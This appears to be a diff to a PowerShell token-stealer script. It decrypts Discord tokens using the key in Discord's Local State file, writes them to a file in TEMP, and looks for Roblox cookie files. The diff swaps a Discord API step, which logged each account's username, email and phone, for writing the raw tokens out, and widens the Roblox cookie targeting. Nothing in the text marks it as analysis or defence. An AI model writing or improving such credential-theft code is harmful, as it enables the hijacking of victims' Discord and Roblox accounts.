@@ -7,7 +7,7 @@ $l = $env:LOCALAPPDATA
 $outfile = Join-Path $env:TEMP "r.txt"
 Remove-Item $outfile -Force -EA SilentlyContinue
 
-# ---------- Discord tokens ----------
+# ---------- Discord tokens (decrypt only, no validation call) ----------
 $mk = $null
 try {
     $ls = Get-Content "$appdata\discord\Local State" -Raw | ConvertFrom-Json
@@ -44,15 +44,10 @@ if ($mk) {
             }
         }
     }
-    foreach ($t in $seen.Keys) {
-        try {
-            $r = Invoke-RestMethod 'https://discord.com/api/v9/users/@me' -Headers @{'Authorization'=$t} -TimeoutSec 5
-            if ($r.username) { Add-Content $outfile "D|$($r.username)|$($r.email)|$($r.phone)|$($r.id)|$t" }
-        } catch {}
-    }
+    foreach ($t in $seen.Keys) { Add-Content $outfile "D|$t" }
 }
 
-# ---------- Roblox ----------
+# ---------- Roblox (legacy + GDK) ----------
 foreach ($rp in @("$l\Roblox\LocalStorage\robloxcookies.dat","$env:USERPROFILE\AppData\Local\Roblox\LocalStorage\robloxcookies.dat")) {
     if (Test-Path $rp) {
         try {
